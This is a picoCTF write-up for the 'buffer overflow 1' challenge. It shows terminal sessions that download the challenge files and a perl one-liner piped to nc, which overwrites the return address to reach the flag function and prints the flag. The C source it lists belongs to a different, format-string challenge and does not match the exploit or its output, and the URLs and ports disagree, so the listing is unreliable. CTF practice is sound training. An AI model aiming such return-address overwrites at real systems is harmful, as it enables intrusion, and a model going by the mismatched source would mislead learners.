# buffer overflow 1

## Descripción

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 55266`

## Pistas

1.- Make sure you consider big Endian vs small Endian.

2.- Changing the address of the return pointer can call different functions.

## Solución

```
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow1]
└─$ wget https://artifacts.picoctf.net/c/91/vuln   
--2023-05-16 14:18:30--  https://artifacts.picoctf.net/c/91/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.160.124.38, 18.160.124.108, 18.160.124.119, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.160.124.38|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15876 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                                     100%[===============================================================================>]  15.50K  --.-KB/s    in 0s      

2023-05-16 14:18:41 (123 MB/s) - ‘vuln’ saved [15876/15876]

                                                                                                                                                                 
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow1]
└─$ wget https://artifacts.picoctf.net/c/91/vuln.c
--2023-05-16 14:18:54--  https://artifacts.picoctf.net/c/91/vuln.c

Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.160.124.119, 18.160.124.34, 18.160.124.108, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.160.124.119|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 947 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                                   100%[===============================================================================>]     947  --.-KB/s    in 0s      

2023-05-16 14:19:03 (17.1 MB/s) - ‘vuln.c’ saved [947/947]

┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow1]
└─$ nano vuln.c 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow1]
└─$ (perl -e 'print "A"x44 . "\xf6\x91\x04\x08";'; echo) | nc saturn.picoctf.net 55531
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f} 
```

## Bandera

picoCTF{addr3ss3s_ar3_3asy_a8284f4f}

## Notas adicionales



## Referencias
- https://artifacts.picoctf.net/c/186/vuln
- https://artifacts.picoctf.net/c/186/vuln.c